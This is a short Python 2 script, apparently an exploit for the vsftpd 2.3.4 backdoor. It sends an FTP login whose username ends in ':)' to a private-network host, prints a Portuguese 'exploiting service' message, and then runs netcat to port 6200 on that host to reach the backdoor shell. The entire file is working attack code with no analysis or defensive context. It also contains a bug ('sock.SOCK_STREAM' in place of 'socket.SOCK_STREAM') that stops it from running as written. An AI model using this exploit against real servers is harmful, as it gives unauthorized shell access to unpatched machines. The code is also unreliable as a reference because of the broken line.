#!/usr/bin/python
import socket,os

s = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
s.connect(("172.16.1.5",21))
r=  s.recv(1024)
s.send ("USER matheus :)\r\n")
s.send("PASS matheus\r\n")
print "Explorando servico..."
os.system("nc -nv 172.16.1.5 6200")
